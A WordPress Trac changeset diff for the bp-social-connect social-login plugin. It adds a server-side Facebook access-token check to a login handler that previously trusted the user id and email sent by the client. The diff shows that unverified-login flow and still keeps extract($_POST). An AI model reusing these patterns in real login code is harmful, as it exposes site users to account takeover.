  | […](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=1409553#L265) | […](/browser/bp-social-connect/trunk/includes/class.settings.php?rev=2914042#L276) |  |
  | 265 | 276 |  |
  | 266 | 277 | function save(){ |
  | 267 |  | ~~$none = $\_POST['save\_settings'];~~ |
  |  | 278 |  |
  | 268 | 279 | if ( !isset($\_POST['save']) || !isset($\_POST['\_wpnonce']) || !wp\_verify\_nonce($\_POST['\_wpnonce'],'save\_settings') ){ |
  | 269 | 280 | \_e('Security check Failed. Contact Administrator.','bp-social-connect'); |
* ## [bp-social-connect/trunk/includes/social/facebook/class.facebook.php](/changeset/2914042/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?old=1622994&old_path=bp-social-connect%2Ftrunk%2Fincludes%2Fsocial%2Ffacebook%2Fclass.facebook.php "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/includes/social/facebook/class.facebook.php")

  | [r1904372](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=1622994#L21 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042#L21 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 21 | 21 | var $facebook\_meta\_key = 'facebook\_id'; |
  | 22 | 22 | function \_\_construct(){ |
  | 23 |  | $this->settings = $this->get(); |
  |  | 23 |  |
  |  | 24 | add\_action( 'login\_enqueue\_scripts',array($this,'login\_enqueue')); |
  | 24 | 25 | add\_action('bp\_social\_connect',array($this,'display\_social\_login')); |
  | 25 | 26 | add\_action('wp\_ajax\_nopriv\_bp\_social\_connect\_facebook\_login',array($this,'bp\_social\_connect\_facebook\_login')); |
  | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=1622994#L28) | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042#L29) |  |
  | 28 | 29 | } |
  | 29 | 30 |  |
  |  | 31 | function login\_enqueue(){ |
  |  | 32 | wp\_enqueue\_script('jquery'); |
  |  | 33 | } |
  |  | 34 |  |
  |  | 35 | function get\_settings(){ |
  |  | 36 | if(empty($this->settings)){ |
  |  | 37 | $this->settings = $this->get(); |
  |  | 38 | } |
  |  | 39 | } |
  | 30 | 40 |  |
  | 31 | 41 | function map\_fields($settings){ |
  | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=1622994#L42) | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042#L52) |  |
  | 42 | 52 |  |
  | 43 | 53 | function display\_social\_login(){ |
  | 44 |  | if(!$this->settings['facebook']) |
  |  | 54 | $this->get\_settings(); |
  |  | 55 |  |
  |  | 56 | if(empty($this->settings['facebook'])) |
  | 45 | 57 | return; |
  | 46 |  | wp\_enqueue\_script('jquery'); |
  |  | 58 |  |
  |  | 59 |  |
  |  | 60 | $fb\_keys=''; |
  | 47 | 61 | ?> |
  |  | 62 | <style> |
  |  | 63 | a.bp\_social\_connect\_facebook:before { content: ""!important; width: 16px; height: 16px; background: url(<?php echo plugins\_url( '../../../assets/images/fb\_logo.png',\_\_FILE\_\_ );?>); background-size: contain; opacity: 1 !important; } |
  |  | 64 | </style> |
  | 48 | 65 | <div id="fb-root" class="bp\_social\_connect\_fb"></div> |
  | 49 | 66 | <script type="text/javascript"> |
  | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=1622994#L95) | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042#L112) |  |
  | 95 | 112 | $this.addClass('loading'); |
  | 96 | 113 | var security = $('#<?php echo $this->security\_key; ?>').val(); |
  | 97 |  | FB.login(function(res~~ponse~~){ |
  | 98 |  | if (res~~ponse~~.authResponse){ |
  |  | 114 | FB.login(function(res){ |
  |  | 115 | if (res && res.authResponse){ |
  | 99 | 116 |  |
  | 100 | 117 | FB.api('/me<?php echo $fb\_keys;?>', function(response) { |
  | 101 | 118 | $.ajax({ |
  | 102 | 119 | url: ajaxurl, |
  | 103 |  | data: 'action=bp\_social\_connect\_facebook\_login&id='+response.id+'&email='+response.email+'&first\_name='+response.first\_name+'&last\_name='+response.last\_name+'&gender='+response.gender+'&name='+response.name+'&link='+response.link+'&locale='+response.locale+'&security='+security, |
  |  | 120 | data: 'action=bp\_social\_connect\_facebook\_login&id='+response.id+'&email='+response.email+'&first\_name='+response.first\_name+'&last\_name='+response.last\_name+'&gender='+response.gender+'&name='+response.name+'&link='+response.link+'&locale='+response.locale+'&accessToken='+res.authResponse.accessToken+'&fbuid='+res.authResponse.id+'&security='+security, |
  | 104 | 121 | type: 'POST', |
  | 105 | 122 | dataType: 'JSON', |
  | 106 | 123 | success:function(data){ |
  | 107 | 124 | $this.removeClass('loading'); |
  | 108 |  | ~~console.log(data);~~ |
  |  | 125 |  |
  | 109 | 126 | if (data.redirect\_uri){ |
  | 110 | 127 | if (data.redirect\_uri =='refresh') { |
  | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=1622994#L138) | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042#L155) |  |
  | 138 | 155 | function bp\_social\_connect\_facebook\_login(){ |
  | 139 | 156 |  |
  | 140 |  |  |
  |  | 157 | $this->get\_settings(); |
  | 141 | 158 | if ( !isset($\_POST['security']) || !wp\_verify\_nonce($\_POST['security'],$this->settings['security']) ){ |
  | 142 |  | \_e('Security check Failed. Contact Administrator.','~~vibe~~'); |
  |  | 159 | \_e('Security check Failed. Contact Administrator.','bp-social-connect'); |
  | 143 | 160 | die(); |
  | 144 | 161 | } |
  | 145 | 162 |  |
  | 146 | 163 | if (!isset($\_POST) || ($\_POST['action'] != 'bp\_social\_connect\_facebook\_login') || !isset($\_POST['id'])){ |
  | 147 |  | \_e('Invalid Post values','~~vibe~~'); |
  |  | 164 | \_e('Invalid Post values','bp-social-connect'); |
  | 148 | 165 | die(); |
  | 149 | 166 | } |
  | 150 | 167 |  |
  |  | 168 | if(!empty($\_POST['accessToken'])){ |
  |  | 169 |  |
  |  | 170 | $reverify = wp\_remote\_get(esc\_url\_raw('https://graph.facebook.com/'.$\_POST['id'].'?fields=email&access\_token='.$\_POST['accessToken'])); |
  |  | 171 | $body = wp\_remote\_retrieve\_body($reverify); |
  |  | 172 | $body = json\_decode($body,true); |
  |  | 173 | if(!empty($body['error']) || empty($body['email']) || !is\_email($\_POST['email']) || sanitize\_email($body['email']) != sanitize\_email($\_POST['email'])){ |
  |  | 174 | \_e('Invalid access token','bp-social-connect'); |
  |  | 175 | die(); |
  |  | 176 | } |
  |  | 177 | if(empty($body['id']) || $body['id'] != $this->settings['facebook\_app\_id']){ |
  |  | 178 | \_e('Invalid access token','bp-social-connect'); |
  |  | 179 | die(); |
  |  | 180 | } |
  |  | 181 |  |
  |  | 182 | }else{ |
  |  | 183 | \_e('Invalid access token','bp-social-connect'); |
  |  | 184 | die(); |
  |  | 185 | } |
  |  | 186 |  |
  |  | 187 | //Verify if call is from Facebook ! |
  | 151 | 188 | extract($\_POST); |
  | 152 | 189 |  |
  | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=1622994#L244) | […](/browser/bp-social-connect/trunk/includes/social/facebook/class.facebook.php?rev=2914042#L281) |  |
  | 244 | 281 | die(); |
  | 245 | 282 | }else{ |
  | 246 |  | \_e('User not created','~~vibe~~'); |
  |  | 283 | \_e('User not created','bp-social-connect'); |
  | 247 | 284 | } |
  | 248 | 285 | } |
* ## [bp-social-connect/trunk/includes/social/google/class.google.php](/changeset/2914042/bp-social-connect/trunk/includes/social/google/class.google.php?old=1622994&old_path=bp-social-connect%2Ftrunk%2Fincludes%2Fsocial%2Fgoogle%2Fclass.google.php "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/includes/social/google/class.google.php")

  | [r1904372](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=1622994#L22 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=2914042#L22 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 22 | 22 |  |
  | 23 | 23 | function \_\_construct(){ |
  | 24 |  | ~~$this->settings = $this->get();~~ |
  |  | 24 |  |
  | 25 | 25 | add\_action('bp\_social\_connect',array($this,'display\_social\_login')); |
  | 26 | 26 | add\_action('template\_redirect', array($this, 'google\_authorize'),1 ); |
  | […](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=1622994#L28) | […](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=2914042#L28) |  |
  | 28 | 28 | } |
  | 29 | 29 |  |
  |  | 30 | function get\_settings(){ |
  |  | 31 | if(empty($this->settings)){ |
  |  | 32 | $this->settings = $this->get(); |
  |  | 33 | } |
  |  | 34 | } |
  |  | 35 |  |
  | 30 | 36 | function verify(){ |
  | 31 |  | if ( $this->settings['google'] && isset($this->settings['google\_client\_id']) && isset($this->settings['google\_client\_secret']) && isset($this->settings['google\_redirect\_uri']) ) { |
  |  | 37 | $this->get\_settings(); |
  |  | 38 | if ( !empty($this->settings['google']) && isset($this->settings['google\_client\_id']) && isset($this->settings['google\_client\_secret']) && isset($this->settings['google\_redirect\_uri']) ) { |
  | 32 | 39 | return true; |
  | 33 | 40 | if(!session\_id()) |
  | […](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=1622994#L56) | […](/browser/bp-social-connect/trunk/includes/social/google/class.google.php?rev=2914042#L63) |  |
  | 56 | 63 |  |
  | 57 | 64 | function load\_google(){ |
  | 58 |  | if(!$this->verify()) |
  | 59 |  | return; |
  | 60 |  |  |
  | 61 |  | if( !class\_exists( 'apiClient' ) ) { // loads the Google class |
  | 62 |  | require\_once ( 'src/apiClient.php' ); |
  | 63 |  | } |
  | 64 |  | if( !class\_exists( 'apiPlusService' ) ) { // Loads the google plus service class for user data |
  | 65 |  | require\_once ( 'src/contrib/apiPlusService.php' ); |
  | 66 |  | } |
  | 67 |  | if( !class\_exists( 'apiOauth2Service' ) ) { // loads the google plus service class for user email |
  | 68 |  | require\_once ( 'src/contrib/apiOauth2Service.php' ); |
  | 69 |  | } |
  | 70 |  |  |
  | 71 |  | // Google Objects |
  | 72 |  | $this->google = new apiClient(); |
  | 73 |  | $this->google->setApplicationName( "Google+ PHP Starter Application" ); |
  | 74 |  | $this->google->setClientId( $this->settings['google\_client\_id'] ); |
  | 75 |  | $this->google->setClientSecret( $this->settings['google\_client\_secret'] ); |
  | 76 |  | $this->google->setRedirectUri( $this->settings['google\_redirect\_uri'] ); |
  | 77 |  | $this->google->setScopes( array( 'https://www.googleapis.com/auth/plus.me','https://www.googleapis.com/auth/userinfo.email' ) ); |
  | 78 |  |  |
  | 79 |  | $this->googleplus = new apiPlusService( $this->google ); // For getting user detail from google |
  | 80 |  | $this->googleoauth2 = new apiOauth2Service( $this->google ); // For gettting user email from google |
  | 81 |  |  |
  | 82 |  | if (isset($\_SESSION['google\_token'])) { |
  | 83 |  | $this->google->setAccessToken($\_SESSION['google\_token']); |
  | 84 |  | } |
  |  | 65 | if(!$this->verify()) |
  |  | 66 | return; |
  |  | 67 | $this->get\_settings(); |
  |  | 68 | if( !class\_exists( 'apiClient' ) ) { // loads the Google class |
  |  | 69 | require\_once ( 'src/apiClient.php' ); |
  |  | 70 | } |
  |  | 71 | if( !class\_exists( 'apiPlusService' ) ) { // Loads the google plus service class for user data |
  |  | 72 | require\_once ( 'src/contrib/apiPlusService.php' ); |
  |  | 73 | } |
  |  | 74 | if( !class\_exists( 'apiOauth2Service' ) ) { // loads the google plus service class for user email |
  |  | 75 | require\_once ( 'src/contrib/apiOauth2Service.php' ); |
  |  | 76 | } |
  |  | 77 |  |
  |  | 78 | // Google Objects |
  |  | 79 | $this->google = new apiClient(); |
  |  | 80 | $this->google->setApplicationName( "Google+ PHP Starter Application" ); |
  |  | 81 | $this->google->setClientId( $this->settings['google\_client\_id'] ); |
  |  | 82 | $this->google->setClientSecret( $this->settings['google\_client\_secret'] ); |
  |  | 83 | $this->google->setRedirectUri( $this->settings['google\_redirect\_uri'] ); |
  |  | 84 | $this->google->setScopes( array( 'https://www.googleapis.com/auth/plus.me','https://www.googleapis.com/auth/userinfo.email' ) ); |
  |  | 85 |  |
  |  | 86 | $this->googleplus = new apiPlusService( $this->google ); // For getting user detail from google |
  |  | 87 | $this->googleoauth2 = new apiOauth2Service( $this->google ); // For gettting user email from google |
  |  | 88 |  |
  |  | 89 | if (isset($\_SESSION['google\_token'])) { |
  |  | 90 | $this->google->setAccessToken($\_SESSION['google\_token']); |
  |  | 91 | } |
  | 85 | 92 |  |
  | 86 | 93 | } |
* ## [bp-social-connect/trunk/includes/social/google/src/service/apiUtils.php](/changeset/2914042/bp-social-connect/trunk/includes/social/google/src/service/apiUtils.php?old=1181145&old_path=bp-social-connect%2Ftrunk%2Fincludes%2Fsocial%2Fgoogle%2Fsrc%2Fservice%2FapiUtils.php "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/includes/social/google/src/service/apiUtils.php")

  | [r1904372](/browser/bp-social-connect/trunk/includes/social/google/src/service/apiUtils.php?rev=1181145#L56 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/includes/social/google/src/service/apiUtils.php?rev=2914042#L56 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 56 | 56 | $d = $ret = 0; |
  | 57 | 57 | for ($count = 0; $count < $strlenVar; ++ $count) { |
  | 58 |  | $ordinalValue = ord($str~~{$ret}~~); |
  |  | 58 | $ordinalValue = ord($str[$ret]); |
  | 59 | 59 | switch (true) { |
  | 60 | 60 | case (($ordinalValue >= 0x20) && ($ordinalValue <= 0x7F)): |
* ## [bp-social-connect/trunk/readme.txt](/changeset/2914042/bp-social-connect/trunk/readme.txt?old=1904372&old_path=bp-social-connect%2Ftrunk%2Freadme.txt "Show the [1904372:2914042] differences restricted to bp-social-connect/trunk/readme.txt")

  | [r1904372](/browser/bp-social-connect/trunk/readme.txt?rev=1904372#L3 "Show revision 1904372 of this file in browser") | [r2914042](/browser/bp-social-connect/trunk/readme.txt?rev=2914042#L3 "Show revision 2914042 of this file in browser") |  |
  | --- | --- | --- |
  | 3 | 3 | Tags: social login, buddypress, social networking, profiles, social, community, networks |
  | 4 | 4 | Requires at least: 3.6 |
  | 5 |  | Tested up to: ~~4.7.4~~ |
  | 6 |  | Stable tag: 1.~~5~~ |
  |  | 5 | Tested up to: 6.2.1 |
  |  | 6 | Stable tag: 1.6.2 |
  | 7 | 7 | License: GPLv2 or later |
  | 8 | 8 | License URI: https://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/bp-social-connect/trunk/readme.txt?rev=1904372#L12) | […](/browser/bp-social-connect/trunk/readme.txt?rev=2914042#L12) |  |
  | 12 | 12 | == Description == |
  | 13 | 13 |  |
  | 14 |  | Connect your BuddyPress site with popular social networks. This plugin will allow you to connect your WordPress or BuddyPress |
  |  | 14 | Connect your BuddyPress site with popular social networks. This plugin will allow you to connect your WordPress or BuddyPress. |
  | 15 | 15 |  |
  | 16 | 16 | 1. Create new users or connect your existing users with their social profiles. |
  | […](/browser/bp-social-connect/trunk/readme.txt?rev=1904372#L20) | […](/browser/bp-social-connect/trunk/readme.txt?rev=2914042#L20) |  |
  | 20 | 20 | 5. Customize button CSS |
  | 21 | 21 |  |
  |  | 22 | Checkout our <a href="https://vibethemes.com">wordpress community plugin</a> |
  | 22 | 23 |  |
  | 23 | 24 | = Supported Social Networking sites = |
  | […](/browser/bp-social-connect/trunk/readme.txt?rev=1904372#L83) | […](/browser/bp-social-connect/trunk/readme.txt?rev=2914042#L84) |  |
  | 83 | 84 |  |
  | 84 | 85 | == Upgrade Notice == |
  |  | 86 | = 1.6 = |
  |  | 87 | \*fb logo |
  | 85 | 88 | = 1.5 = |
  | 86 | 89 | \* WP\_login hook update (thanks to Martin Marty) |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2914042&old=1904372&new_path=%2Fbp-social-connect%2Ftrunk&old_path=%2Fbp-social-connect%2Ftrunk)
* [Zip Archive](?format=zip&new=2914042&old=1904372&new_path=%2Fbp-social-connect%2Ftrunk&old_path=%2Fbp-social-connect%2Ftrunk)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


